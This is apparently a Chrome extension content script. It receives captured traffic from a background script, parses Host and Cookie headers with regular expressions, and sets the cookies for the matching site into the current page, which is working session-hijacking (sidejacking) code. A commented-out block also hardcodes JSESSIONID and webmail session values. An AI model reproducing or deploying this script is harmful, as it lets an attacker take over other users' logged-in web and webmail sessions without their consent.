/*var myRequest = new Request('data.txt');
  fetch(myRequest).then(function(response) {
    return response.text().then(function(text) {
      document.write(text);
    });
  });
document.cookie = "JSESSIONID=3B8DC6391EA930EC77B0DEA77B2D9187";
document.cookie = "webmailsid=LaZWUPdXYsc"; 
window.alert("test content");*/
//window.alert(location.hostname);
chrome.runtime.sendMessage({greeting: "hello"}, function(response) {
  //console.log(response.farewell);
  var data = response.farewell
  		var pattern = /(Host: ((\S)+)[\r\n]+)|(Cookie: ((\w+)=(\w+); )*((\w+)=(\w+))[\r\n]+)/gm;
		var str = data.match(pattern);
		text = '';
		for(var i1 = 0; i1 < str.length; i1++)
		{
			text = text.concat(str[i1]);
		}
		console.log(text);
  		var pattern = /Host: (\S+)[\r\n]+Cookie: ((\w+)=(\w+); )*((\w+)=(\w+))/gm;

		var str = data.match(pattern);
		if(str!=null)
		{
			for(var i1 = 0; i1 < str.length; i1++)
			{
				/*console.log(str[i1].split("\n")[0].slice(6));
				console.log(location.hostname);
				console.log(typeof(str[i1].split("\n")[0].slice(6)));
				console.log(typeof(location.hostname));
				console.log(str[i1].split("\n")[0].slice(6).length);
				console.log(location.hostname.length);
				console.log(str[i1].split("\n")[0].slice(6)===location.hostname)*/
				if(str[i1].split("\n")[0].slice(6).trim()===location.hostname.trim())
				{
					var cookies_found = str[i1].split("\n")[1].slice(8).split("; ")
					for(var i2 = 0; i2 < cookies_found.length; i2++)
					{
						console.log(cookies_found[i2]);
						console.log("<br>");
						document.cookie = cookies_found[i2].trim();
					}
				}
			}
		}

})


